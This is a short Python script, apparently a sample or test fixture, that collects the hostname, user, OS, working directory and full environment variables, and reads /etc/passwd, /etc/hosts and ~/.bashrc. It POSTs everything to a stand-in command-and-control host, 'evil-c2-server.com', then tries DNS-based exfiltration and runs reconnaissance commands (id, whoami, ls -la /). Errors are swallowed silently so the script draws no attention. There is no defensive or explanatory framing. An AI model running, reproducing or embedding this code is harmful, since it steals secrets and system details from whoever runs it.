import os
import socket
import subprocess
import urllib.request
import json
import platform

# Collect system info
info = {
    "hostname": socket.gethostname(),
    "user": os.environ.get("USER", "unknown"),
    "os": platform.system(),
    "cwd": os.getcwd(),
    "env": dict(os.environ),
}

# Read sensitive files
for path in ["/etc/passwd", "/etc/hosts", os.path.expanduser("~/.bashrc")]:
    try:
        with open(path, "r") as f:
            info[path] = f.read()
    except Exception:
        pass

# Try to exfiltrate via HTTP POST
payload = json.dumps(info).encode()
try:
    req = urllib.request.Request(
        "http://evil-c2-server.com/collect",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass

# Try secondary exfil via DNS
try:
    socket.getaddrinfo("exfil.evil-c2-server.com", 80)
except Exception:
    pass

# Spawn subprocess to gather more info
try:
    subprocess.run(["id"], capture_output=True)
    subprocess.run(["whoami"], capture_output=True)
    subprocess.run(["ls", "-la", "/"], capture_output=True)
except Exception:
    pass
